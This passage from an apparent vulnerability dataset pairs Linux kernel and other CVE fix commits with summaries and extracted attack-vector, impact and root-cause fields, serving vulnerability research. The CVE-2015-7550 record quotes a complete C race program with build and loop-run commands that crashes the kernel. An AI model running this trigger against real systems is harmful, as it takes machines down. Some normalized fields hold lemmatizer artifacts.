ext4_fill_super function.","commit_message_1":"use ext4_get_block_write in buffer write allocate uninitialized extent before ext4 buffer write and convert the extent to initialized after io completes","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted usb device , related to the ext4 _ fill _ super function","Impact":"cause a denial of service ( pointer dereference and panic )","Root Cause":"does not properly track the initialization of certain data structures","Attack Type":"local attacker"},{"commit_id":"cb3232138e37129e88240a98a1d2aba2187ff57c","cve_id":"CVE-2015-7566","cwe_id":null,"commit_message":"USB: serial: visor: fix crash on detecting device without write_urbs\n\nThe visor driver crashes in clie_5_attach() when a specially crafted USB\ndevice without bulk-out endpoint is detected. This fix adds a check that\nthe device has proper configuration expected by the driver.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net>\nSigned-off-by: Vladis Dronov <vdronov@redhat.com>\nFixes: cfb8da8f69b8 (\"USB: visor: fix initialisation of UX50\/TH55 devices\")\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The clie_5_attach function in drivers\/usb\/serial\/visor.c in the Linux kernel through 4.4.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by inserting a USB device that lacks a bulk-out endpoint.","commit_message_1":"serial : visor : fix crash on detecting device without write_urbs the visor driver crash in clie_5_attach ( ) when a specially crafted usb device without bulk-out endpoint is detected","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by inserting a usb device that lacks a bulk - out endpoint","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"b4a1b4f5047e4f54e194681125c74c0aa64d637d","cve_id":"CVE-2015-7550","cwe_id":"CWE-362","commit_message":"KEYS: Fix race between read and revoke\n\nThis fixes CVE-2015-7550.\n\nThere's a race between keyctl_read() and keyctl_revoke().  If the revoke\nhappens between keyctl_read() checking the validity of a key and the key's\nsemaphore being taken, then the key type read method will see a revoked key.\n\nThis causes a problem for the user-defined key type because it assumes in\nits read method that there will always be a payload in a non-revoked key\nand doesn't check for a NULL pointer.\n\nFix this by making keyctl_read() check the validity of a key after taking\nsemaphore instead of before.\n\nI think the bug was introduced with the original keyrings code.\n\nThis was discovered by a multithreaded test program generated by syzkaller\n(http:\/\/github.com\/google\/syzkaller).  Here's a cleaned up version:\n\n\t#include <sys\/types.h>\n\t#include <keyutils.h>\n\t#include <pthread.h>\n\tvoid *thr0(void *arg)\n\t{\n\t\tkey_serial_t key = (unsigned long)arg;\n\t\tkeyctl_revoke(key);\n\t\treturn 0;\n\t}\n\tvoid *thr1(void *arg)\n\t{\n\t\tkey_serial_t key = (unsigned long)arg;\n\t\tchar buffer[16];\n\t\tkeyctl_read(key, buffer, 16);\n\t\treturn 0;\n\t}\n\tint main()\n\t{\n\t\tkey_serial_t key = add_key(\"user\", \"%\", \"foo\", 3, KEY_SPEC_USER_KEYRING);\n\t\tpthread_t th[5];\n\t\tpthread_create(&th[0], 0, thr0, (void *)(unsigned long)key);\n\t\tpthread_create(&th[1], 0, thr1, (void *)(unsigned long)key);\n\t\tpthread_create(&th[2], 0, thr0, (void *)(unsigned long)key);\n\t\tpthread_create(&th[3], 0, thr1, (void *)(unsigned long)key);\n\t\tpthread_join(th[0], 0);\n\t\tpthread_join(th[1], 0);\n\t\tpthread_join(th[2], 0);\n\t\tpthread_join(th[3], 0);\n\t\treturn 0;\n\t}\n\nBuild as:\n\n\tcc -o keyctl-race keyctl-race.c -lkeyutils -lpthread\n\nRun as:\n\n\twhile keyctl-race; do :; done\n\nas it may need several iterations to crash the kernel.  The crash can be\nsummarised as:\n\n\tBUG: unable to handle kernel NULL pointer dereference at 0000000000000010\n\tIP: [<ffffffff81279b08>] user_read+0x56\/0xa3\n\t...\n\tCall Trace:\n\t [<ffffffff81276aa9>] keyctl_read_key+0xb6\/0xd7\n\t [<ffffffff81277815>] SyS_keyctl+0x83\/0xe0\n\t [<ffffffff815dbb97>] entry_SYSCALL_64_fastpath+0x12\/0x6f\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The keyctl_read_key function in security\/keys\/keyctl.c in the Linux kernel before 4.3.4 does not properly use a semaphore, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted application that leverages a race condition between keyctl_revoke and keyctl_read calls.","commit_message_1":"fix race between read and revoke this fix <cve_id>","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that leverages a race condition between keyctl _ revoke and keyctl _ read calls","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly use a semaphore","Attack Type":"local attacker"},{"commit_id":"ddb8ecc4ebf260e4967f57f271d4f5761abeac3e","cve_id":"CVE-2015-7519","cwe_id":"CWE-20","commit_message":"Fix CVE-2015-7519 header collision vulnerability","summary":"agent\/Core\/Controller\/SendRequest.cpp in Phusion Passenger before 4.0.60 and 5.0.x before 5.0.22, when used in Apache integration mode or in standalone mode without a filtering proxy, allows remote attackers to spoof headers passed to applications by using an _ (underscore) character instead of a - (dash) character in an HTTP header, as demonstrated by an X_User header.","commit_message_1":"fix <cve_id> header collision vulnerability","Vulnerability Type":"Improper Input Validation","Attack Vector":"by using an _ ( underscore ) character instead of a - ( dash ) character in an http header , as demonstrated by an x _ user header","Impact":"spoof headers passed to applications","Root Cause":"caused by the setting of a colliding header when the SCGI protocol is used and an app depends on a header set by trusted server that includes a dash","Attack Type":"remote attacker"},{"commit_id":"8e20cf2bce122ce9262d6034ee5d5b76fbb92f96","cve_id":"CVE-2015-7515","cwe_id":null,"commit_message":"Input: aiptek - fix crash on detecting device without endpoints\n\nThe aiptek driver crashes in aiptek_probe() when a specially crafted USB\ndevice without endpoints is detected. This fix adds a check that the device\nhas proper configuration expected by the driver. Also an error return value\nis changed to more matching one in one of the error paths.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net>\nSigned-off-by: Vladis Dronov <vdronov@redhat.com>\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The aiptek_probe function in drivers\/input\/tablet\/aiptek.c in the Linux kernel before 4.4 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted USB device that lacks endpoints.","commit_message_1":"aiptek - fix crash on detecting device without endpoint the aiptek driver crash in aiptek_probe ( ) when a specially crafted usb device without endpoint is detected","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted usb device that lacks endpoints","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"0185604c2d82c560dab2f2933a18f797e74ab5a8","cve_id":"CVE-2015-7513","cwe_id":null,"commit_message":"KVM: x86: Reload pit counters for all channels when restoring state\n\nCurrently if userspace restores the pit counters with a count of 0\non channels 1 or 2 and the guest attempts to read the count on those\nchannels, then KVM will perform a mod of 0 and crash.  This will ensure\nthat 0 values are converted to 65536 as per the spec.\n\nThis is CVE-2015-7513.\n\nSigned-off-by: Andy Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/x86.c in the Linux kernel before 4.4 does not reset the PIT counter values during state restoration, which allows guest OS users to cause a denial of service (divide-by-zero error and host OS crash) via a zero value, related to the kvm_vm_ioctl_set_pit and kvm_vm_ioctl_set_pit2 functions.","commit_message_1":"x86 : reload pit counter for all channel when restoring state currently if userspace restores the pit counter with a count of <number> on channel <number> or <number> and the guest attempt to read the count on those channel , then kvm will perform a mod of <number> and crash","Vulnerability Type":"divide-by-zero error","Attack Vector":"via a zero value , related to the kvm _ vm _ ioctl _ set _ pit and kvm _ vm _ ioctl _ set _ pit2 functions","Impact":"cause a denial of service ( divide - by - zero error and host os crash )","Root Cause":"does not reset the pit counter values during state restoration","Attack Type":"local attacker"},{"commit_id":"820f9f147dcce2602eefd9b575bbbd9ea14f0953","cve_id":"CVE-2015-4178","cwe_id":null,"commit_message":"fs_pin: Allow for the possibility that m_list or s_list go unused.\n\nThis is needed to support lazily umounting locked mounts.  Because the\nentire unmounted subtree needs to stay together until there are no\nusers with references to any part of the subtree.\n\nTo support this guarantee that the fs_pin m_list and s_list nodes\nare initialized by initializing them in init_fs_pin allowing\nfor the possibility that pin_insert_group does not touch them.\n\nFurther use hlist_del_init in pin_remove so that there is\na hlist_unhashed test before the list we attempt to update\nthe previous list item.\n\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The fs_pin implementation in the Linux kernel before 4.0.5 does not ensure the internal consistency of a certain list data structure, which allows local users to cause a denial of service (system crash) by leveraging user-namespace root access for an MNT_DETACH umount2 system call, related to fs\/fs_pin.c and include\/linux\/fs_pin.h.","commit_message_1":"allow for the possibility that m_list or s_list go unused","Vulnerability Type":"system crash","Attack Vector":"by leveraging user - namespace root access for an mnt _ detach umount2 system call , related to fs \/ fs _ pin . c and include \/ linux \/ fs _ pin . h","Impact":"cause a denial of service ( system crash )","Root Cause":"does not ensure the internal consistency of a certain list data structure","Attack Type":"local attacker"},{"commit_id":"cd4a40174b71acd021877341684d8bb1dc8ea4ae","cve_id":"CVE-2015-4177","cwe_id":null,"commit_message":"mnt: Fail collect_mounts when applied to unmounted mounts\n\nThe only users of collect_mounts are in audit_tree.c\n\nIn audit_trim_trees and audit_add_tree_rule the path passed into\ncollect_mounts is generated from kern_path passed an audit_tree\npathname which is guaranteed to be an absolute path.   In those cases\ncollect_mounts is obviously intended to work on mounted paths and\nif a race results in paths that are unmounted when collect_mounts\nit is reasonable to fail early.\n\nThe paths passed into audit_tag_tree don't have the absolute path\ncheck.  But are used to play with fsnotify and otherwise interact with\nthe audit_trees, so again operating only on mounted paths appears\nreasonable.\n\nAvoid having to worry about what happens when we try and audit\nunmounted filesystems by restricting collect_mounts to mounts\nthat appear in the mount tree.\n\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The collect_mounts function in fs\/namespace.c in the Linux kernel before 4.0.5 does not properly consider that it may execute after a path has been unmounted, which allows local users to cause a denial of service (system crash) by leveraging user-namespace root access for an MNT_DETACH umount2 system call.","commit_message_1":"fail collect_mounts when applied to unmounted mount the only user of collect_mounts are in <file> in audit_trim_trees and audit_add_tree_rule the path passed into collect_mounts is generated from kern_path passed an audit_tree pathname which is guaranteed to be an absolute path","Vulnerability Type":"system crash","Attack Vector":"by leveraging user - namespace root access for an mnt _ detach umount2 system call","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly consider that it may execute after a path has been unmounted","Attack Type":"local attacker"},{"commit_id":"e0c9c0afd2fc958ffa34b697972721d81df8a56f","cve_id":"CVE-2015-4176","cwe_id":"CWE-200","commit_message":"mnt: Update detach_mounts to leave mounts connected\n\nNow that it is possible to lazily unmount an entire mount tree and\nleave the individual mounts connected to each other add a new flag\nUMOUNT_CONNECTED to umount_tree to force this behavior and use\nthis flag in detach_mounts.\n\nThis closes a bug where the deletion of a file or directory could\ntrigger an unmount and reveal data under a mount point.\n\nCc: stable@vger.kernel.org\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"fs\/namespace.c in the Linux kernel before 4.0.2 does not properly support mount connectivity, which allows local users to read arbitrary files by leveraging user-namespace root access for deletion of a file or directory.","commit_message_1":"update detach_mounts to leave mount connected now that it is possible to lazily unmount an entire mount tree and leave the individual mount connected to each other add a new flag umount_connected to umount_tree to force this behavior and use this flag in detach_mounts","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging user - namespace root access for deletion of a file or directory","Impact":"read arbitrary files","Root Cause":"does not properly support mount connectivity","Attack Type":"local attacker"},{"commit_id":"cf872776fc84128bb779ce2b83a37c884c3203ae","cve_id":"CVE-2015-4170","cwe_id":"CWE-362","commit_message":"tty: Fix hang at ldsem_down_read()\n\nWhen a controlling tty is being hung up and the hang up is\nwaiting for a just-signalled tty reader or writer to exit, and a new tty\nreader\/writer tries to acquire an ldisc reference concurrently with the\nldisc reference release from the signalled reader\/writer, the hangup\ncan hang. The new reader\/writer is sleeping in ldsem_down_read() and the\nhangup is sleeping in ldsem_down_write() [1].\n\nThe new reader\/writer fails to wakeup the waiting hangup because the\nwrong lock count value is checked (the old lock count rather than the new\nlock count) to see if the lock is unowned.\n\nChange helper function to return the new lock count if the cmpxchg was\nsuccessful; document this behavior.\n\n[1] edited dmesg log from reporter\n\nSysRq : Show Blocked State\n  task                        PC stack   pid father\nsystemd         D ffff88040c4f0000     0     1      0 0x00000000\n ffff88040c49fbe0 0000000000000046 ffff88040c4a0000 ffff88040c49ffd8\n 00000000001d3980 00000000001d3980 ffff88040c4a0000 ffff88040593d840\n ffff88040c49fb40 ffffffff810a4cc0 0000000000000006 0000000000000023\nCall Trace:\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff817a6649>] schedule+0x24\/0x5e\n [<ffffffff817a588b>] schedule_timeout+0x15b\/0x1ec\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24\/0x26\n [<ffffffff817aa10c>] down_read_failed+0xe3\/0x1b9\n [<ffffffff817aa26d>] ldsem_down_read+0x8b\/0xa5\n [<ffffffff8142b5ca>] ? tty_ldisc_ref_wait+0x1b\/0x44\n [<ffffffff8142b5ca>] tty_ldisc_ref_wait+0x1b\/0x44\n [<ffffffff81423f5b>] tty_write+0x7d\/0x28a\n [<ffffffff814241f5>] redirected_tty_write+0x8d\/0x98\n [<ffffffff81424168>] ? tty_write+0x28a\/0x28a\n [<ffffffff8115d03f>] do_loop_readv_writev+0x56\/0x79\n [<ffffffff8115e604>] do_readv_writev+0x1b0\/0x1ff\n [<ffffffff8116ea0b>] ? do_vfs_ioctl+0x32a\/0x489\n [<ffffffff81167d9d>] ? final_putname+0x1d\/0x3a\n [<ffffffff8115e6c7>] vfs_writev+0x2e\/0x49\n [<ffffffff8115e7d3>] SyS_writev+0x47\/0xaa\n [<ffffffff817ab822>] system_call_fastpath+0x16\/0x1b\nbash            D ffffffff81c104c0     0  5469   5302 0x00000082\n ffff8800cf817ac0 0000000000000046 ffff8804086b22a0 ffff8800cf817fd8\n 00000000001d3980 00000000001d3980 ffff8804086b22a0 ffff8800cf817a48\n 000000000000b9a0 ffff8800cf817a78 ffffffff81004675 ffff8800cf817a44\nCall Trace:\n [<ffffffff81004675>] ? dump_trace+0x165\/0x29c\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff8100edda>] ? save_stack_trace+0x26\/0x41\n [<ffffffff817a6649>] schedule+0x24\/0x5e\n [<ffffffff817a588b>] schedule_timeout+0x15b\/0x1ec\n [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f\/0xe4\n [<ffffffff817a9f03>] ? down_write_failed+0xa3\/0x1c9\n [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24\/0x26\n [<ffffffff817a9f0b>] down_write_failed+0xab\/0x1c9\n [<ffffffff817aa300>] ldsem_down_write+0x79\/0xb1\n [<ffffffff817aada3>] ? tty_ldisc_lock_pair_timeout+0xa5\/0xd9\n [<ffffffff817aada3>] tty_ldisc_lock_pair_timeout+0xa5\/0xd9\n [<ffffffff8142bf33>] tty_ldisc_hangup+0xc4\/0x218\n [<ffffffff81423ab3>] __tty_hangup+0x2e2\/0x3ed\n [<ffffffff81424a76>] disassociate_ctty+0x63\/0x226\n [<ffffffff81078aa7>] do_exit+0x79f\/0xa11\n [<ffffffff81086bdb>] ? get_signal_to_deliver+0x206\/0x62f\n [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf\/0x16e\n [<ffffffff81079b05>] do_group_exit+0x47\/0xb5\n [<ffffffff81086c16>] get_signal_to_deliver+0x241\/0x62f\n [<ffffffff810020a7>] do_signal+0x43\/0x59d\n [<ffffffff810f2af7>] ? __audit_syscall_exit+0x21a\/0x2a8\n [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf\/0x16e\n [<ffffffff81002655>] do_notify_resume+0x54\/0x6c\n [<ffffffff817abaf8>] int_signal+0x12\/0x17\n\nReported-by: Sami Farin <sami.farin@gmail.com>\nCc: <stable@vger.kernel.org> # 3.12.x\nSigned-off-by: Peter Hurley <peter@hurleysoftware.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Race condition in the ldsem_cmpxchg function in drivers\/tty\/tty_ldsem.c in the Linux kernel before 3.13-rc4-next-20131218 allows local users to cause a denial of service (ldsem_down_read and ldsem_down_write deadlock) by establishing a new tty thread during shutdown of a previous tty thread.","commit_message_1":"fix hang at ldsem_down_read ( ) when a controlling tty is being hung up and the hang up is waiting for a just-signalled tty reader or writer to exit , and a new tty reader\/writer try to acquire an ldisc reference concurrently with the ldisc reference release from the signalled reader\/writer , the hangup can hang","Vulnerability Type":"Race Condition","Attack Vector":"by establishing a new tty thread during shutdown of a previous tty thread","Impact":"cause a denial of service ( ldsem _ down _ read and ldsem _ down _ write deadlock )","Root Cause":"caused by a race condition on tty ldisc during shutdown","Attack Type":"local attacker"},{"commit_id":"6b7339f4c31ad69c8e9c0b2859276e22cf72176d","cve_id":"CVE-2015-3288","cwe_id":"CWE-20","commit_message":"mm: avoid setting up anonymous pages into file mapping\n\nReading page fault handler code I've noticed that under right\ncircumstances kernel would map anonymous pages into file mappings: if\nthe VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated\non ->mmap(), kernel would handle page fault to not populated pte with\ndo_anonymous_page().\n\nLet's change page fault handler to use do_anonymous_page() only on\nanonymous VMA (->vm_ops == NULL) and make sure that the VMA is not\nshared.\n\nFor file mappings without vm_ops->fault() or shred VMA without vm_ops,\npage fault on pte_none() entry would lead to SIGBUS.\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Willy Tarreau <w@1wt.eu>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"mm\/memory.c in the Linux kernel before 4.1.4 mishandles anonymous pages, which allows local users to gain privileges or cause a denial of service (page tainting) via a crafted application that triggers writing to page zero.","commit_message_1":"avoid setting up anonymous page into file mapping reading page fault handler code i 've noticed that under right circumstance kernel would map anonymous page into file mapping : if the vma doe n't have vm_ops- > fault ( ) and the vma wa n't fully populated on - > mmap ( ) , kernel would handle page fault to not populated pte with do_anonymous_page ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application that triggers writing to page zero","Impact":"gain privileges or cause a denial of service ( page tainting )","Root Cause":"caused by mishandling anonymous pages by mm\/memory.c","Attack Type":"local attacker"},{"commit_id":"3bd5589e1a5a93f9c224badf983cd65c45215390","cve_id":"CVE-2015-3152","cwe_id":"CWE-284","commit_message":"WL#6791 : Redefine client --ssl option to imply enforced encryption\n\n# Changed the meaning of the --ssl=1 option of all client binaries\nto mean force ssl, not try ssl and fail over to eunecrypted\n# Added a new MYSQL_OPT_SSL_ENFORCE mysql_options()\noption to specify that an ssl connection is required.\n# Added a new macro SSL_SET_OPTIONS() to the client\nSSL handling headers that sets all the relevant SSL options at \nonce.\n# Revamped all of the current native clients to use the new macro\n# Removed some Windows line endings.\n# Added proper handling of the new option into the ssl helper\nheaders.\n# If SSL is mandatory assume that the media is secure enough \nfor the sha256 plugin to do unencrypted password exchange even\nbefore establishing a connection.\n# Set the default ssl cipher to DHE-RSA-AES256-SHA if none is \nspecified.\n# updated test cases that require a non-default cipher to spawn \na mysql command line tool binary since mysqltest has no support\nfor specifying ciphers.\n# updated the replication slave connection code to always enforce\nSSL if any of the SSL config options is present.\n# test cases added and updated.\n# added a mysql_get_option() API to return mysql_options() \nvalues. Used the new API inside the sha256 plugin.\n# Fixed compilation warnings because of unused variables.\n# Fixed test failures (mysql_ssl and bug13115401)\n# Fixed whitespace issues.\n# Fully implemented the mysql_get_option() function.\n# Added a test case for mysql_get_option()\n# fixed some trailing whitespace issues\n# fixed some uint\/int warnings in mysql_client_test.c\n# removed shared memory option from non-windows get_options\n tests\n# moved MYSQL_OPT_LOCAL_INFILE to the uint options","summary":"Oracle MySQL before 5.7.3, Oracle MySQL Connector\/C (aka libmysqlclient) before 6.1.3, and MariaDB before 5.5.44 use the --ssl option to mean that SSL is optional, which allows man-in-the-middle attackers to spoof servers via a cleartext-downgrade attack, aka a *BACKRONYM* attack.","commit_message_1":"redefine client -- ssl option to imply enforced encryption # changed the meaning of the -- ssl=<number> option of all client binary to mean force ssl , not try ssl and fail over to eunecrypted # added a new mysql_opt_ssl_enforce mysql_options ( ) option to specify that an ssl connection is required","Vulnerability Type":"Improper Access Control","Attack Vector":"via a cleartext - downgrade attack , aka a * backronym * attack","Impact":"downgrade to a weaker algorithm and decrypt and modify information","Root Cause":"caused by the failure to require SSL\/TLS protection by the --ssl' client option","Attack Type":"remote attacker"},{"commit_id":"4de930efc23b92ddf88ce91c405ee645fe6e27ea","cve_id":"CVE-2015-2686","cwe_id":"CWE-264","commit_message":"net: validate the range we feed to iov_iter_init() in sys_sendto\/sys_recvfrom\n\nCc: stable@vger.kernel.org # v3.19\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/socket.c in the Linux kernel 3.19 before 3.19.3 does not validate certain range data for (1) sendto and (2) recvfrom system calls, which allows local users to gain privileges by leveraging a subsystem that uses the copy_from_iter function in the iov_iter interface, as demonstrated by the Bluetooth subsystem.","commit_message_1":"validate the range we feed to iov_iter_init ( ) in sys_sendto\/sys_recvfrom","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging a subsystem that uses the copy _ from _ iter function in the iov _ iter interface , as demonstrated by the bluetooth subsystem","Impact":"gain privileges","Root Cause":"does not validate certain range data for send to and recvfrom system calls","Attack Type":"local attacker"},{"commit_id":"06c8173eb92bbfc03a0fe8bb64315857d0badd06","cve_id":"CVE-2015-2672","cwe_id":"CWE-20","commit_message":"x86\/fpu\/xsaves: Fix improper uses of __ex_table\n\nCommit:\n\n  f31a9f7c7169 (\"x86\/xsaves: Use xsaves\/xrstors to save and restore xsave area\")\n\nintroduced alternative instructions for XSAVES\/XRSTORS and commit:\n\n  adb9d526e982 (\"x86\/xsaves: Add xsaves and xrstors support for booting time\")\n\nadded support for the XSAVES\/XRSTORS instructions at boot time.\n\nUnfortunately both failed to properly protect them against faulting:\n\nThe 'xstate_fault' macro will use the closest label named '1'\nbackward and that ends up in the .altinstr_replacement section\nrather than in .text. This means that the kernel will never find\nin the __ex_table the .text address where this instruction might\nfault, leading to serious problems if userspace manages to\ntrigger the fault.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nSigned-off-by: Jamie Iles <jamie.iles@oracle.com>\n[ Improved the changelog, fixed some whitespace noise. ]\nAcked-by: Borislav Petkov <bp@alien8.de>\nAcked-by: Linus Torvalds <torvalds@linux-foundation.org>\nCc: <stable@vger.kernel.org>\nCc: Allan Xavier <mr.a.xavier@gmail.com>\nCc: H. Peter Anvin <hpa@zytor.com>\nCc: Thomas Gleixner <tglx@linutronix.de>\nFixes: adb9d526e982 (\"x86\/xsaves: Add xsaves and xrstors support for booting time\")\nFixes: f31a9f7c7169 (\"x86\/xsaves: Use xsaves\/xrstors to save and restore xsave area\")\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The xsave\/xrstor implementation in arch\/x86\/include\/asm\/xsave.h in the Linux kernel before 3.19.2 creates certain .altinstr_replacement pointers and consequently does not provide any protection against instruction faulting, which allows local users to cause a denial of service (panic) by triggering a fault, as demonstrated by an unaligned memory operand or a non-canonical address memory operand.","commit_message_1":"fix improper us of __ex_table commit : f31a9f7c7169 ( `` x86\/xsaves : use xsaves\/xrstors to save and restore xsave area '' ) introduced alternative instruction for xsaves\/xrstors and commit : adb9d526e982 ( `` x86\/xsaves : add xsaves and xrstors support for booting time '' ) added support for the xsaves\/xrstors instruction at boot time","Vulnerability Type":"Improper Input Validation","Attack Vector":"by triggering a fault , as demonstrated by an unaligned memory operand or a non - canonical address memory operand","Impact":"cause a denial of service ( panic )","Root Cause":"creates certain . altinstr _ replacement pointers and consequently does not provide any protection against instruction faulting","Attack Type":"local attacker"},{"commit_id":"a2f18db0c68fec96631c10cad9384c196e9008ac","cve_id":"CVE-2015-1573","cwe_id":"CWE-19","commit_message":"netfilter: nf_tables: fix flush ruleset chain dependencies\n\nJumping between chains doesn't mix well with flush ruleset. Rules\nfrom a different chain and set elements may still refer to us.\n\n[  353.373791] ------------[ cut here ]------------\n[  353.373845] kernel BUG at net\/netfilter\/nf_tables_api.c:1159!\n[  353.373896] invalid opcode: 0000 [#1] SMP\n[  353.373942] Modules linked in: intel_powerclamp uas iwldvm iwlwifi\n[  353.374017] CPU: 0 PID: 6445 Comm: 31c3.nft Not tainted 3.18.0 #98\n[  353.374069] Hardware name: LENOVO 5129CTO\/5129CTO, BIOS 6QET47WW (1.17 ) 07\/14\/2010\n[...]\n[  353.375018] Call Trace:\n[  353.375046]  [<ffffffff81964c31>] ? nf_tables_commit+0x381\/0x540\n[  353.375101]  [<ffffffff81949118>] nfnetlink_rcv+0x3d8\/0x4b0\n[  353.375150]  [<ffffffff81943fc5>] netlink_unicast+0x105\/0x1a0\n[  353.375200]  [<ffffffff8194438e>] netlink_sendmsg+0x32e\/0x790\n[  353.375253]  [<ffffffff818f398e>] sock_sendmsg+0x8e\/0xc0\n[  353.375300]  [<ffffffff818f36b9>] ? move_addr_to_kernel.part.20+0x19\/0x70\n[  353.375357]  [<ffffffff818f44f9>] ? move_addr_to_kernel+0x19\/0x30\n[  353.375410]  [<ffffffff819016d2>] ? verify_iovec+0x42\/0xd0\n[  353.375459]  [<ffffffff818f3e10>] ___sys_sendmsg+0x3f0\/0x400\n[  353.375510]  [<ffffffff810615fa>] ? native_sched_clock+0x2a\/0x90\n[  353.375563]  [<ffffffff81176697>] ? acct_account_cputime+0x17\/0x20\n[  353.375616]  [<ffffffff8110dc78>] ? account_user_time+0x88\/0xa0\n[  353.375667]  [<ffffffff818f4bbd>] __sys_sendmsg+0x3d\/0x80\n[  353.375719]  [<ffffffff81b184f4>] ? int_check_syscall_exit_work+0x34\/0x3d\n[  353.375776]  [<ffffffff818f4c0d>] SyS_sendmsg+0xd\/0x20\n[  353.375823]  [<ffffffff81b1826d>] system_call_fastpath+0x16\/0x1b\n\nRelease objects in this order: rules -> sets -> chains -> tables, to\nmake sure no references to chains are held anymore.\n\nReported-by: Asbjoern Sloth Toennesen <asbjorn@asbjorn.biz>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The nft_flush_table function in net\/netfilter\/nf_tables_api.c in the Linux kernel before 3.18.5 mishandles the interaction between cross-chain jumps and ruleset flushes, which allows local users to cause a denial of service (panic) by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"nf_tables : fix flush ruleset chain dependency jumping between chain doe n't mix well with flush ruleset","Vulnerability Type":"Data Processing Errors","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"2c5816b4beccc8ba709144539f6fdd764f8fa49c","cve_id":"CVE-2015-1339","cwe_id":"CWE-399","commit_message":"cuse: fix memory leak\n\nThe problem is that fuse_dev_alloc() acquires an extra reference to cc.fc,\nand the original ref count is never dropped.\n\nReported-by: Colin Ian King <colin.king@canonical.com>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nFixes: cc080e9e9be1 (\"fuse: introduce per-instance fuse_dev structure\")\nCc: <stable@vger.kernel.org> # v4.2+","summary":"Memory leak in the cuse_channel_release function in fs\/fuse\/cuse.c in the Linux kernel before 4.4 allows local users to cause a denial of service (memory consumption) or possibly have unspecified other impact by opening \/dev\/cuse many times.","commit_message_1":"fix memory leak the problem is that fuse_dev_alloc ( ) acquires an extra reference to <file> , and the original ref count is never dropped","Vulnerability Type":"Resource Management Errors","Attack Vector":"by opening \/ dev \/ cuse many times","Impact":"cause a denial of service ( memory consumption ) or possibly have unspecified other impact","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"6217e5ede23285ddfee10d2e4ba0cc2d4c046205","cve_id":"CVE-2014-9904","cwe_id":null,"commit_message":"ALSA: compress: fix an integer overflow check\n\nI previously added an integer overflow check here but looking at it now,\nit's still buggy.\n\nThe bug happens in snd_compr_allocate_buffer().  We multiply\n\".fragments\" and \".fragment_size\" and that doesn't overflow but then we\nsave it in an unsigned int so it truncates the high bits away and we\nallocate a smaller than expected size.\n\nFixes: b35cc8225845 ('ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()')\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_compress_check_input function in sound\/core\/compress_offload.c in the ALSA subsystem in the Linux kernel before 3.17 does not properly check for an integer overflow, which allows local users to cause a denial of service (insufficient memory allocation) or possibly have unspecified other impact via a crafted SNDRV_COMPRESS_SET_PARAMS ioctl call.","commit_message_1":"compress : fix an integer overflow check i 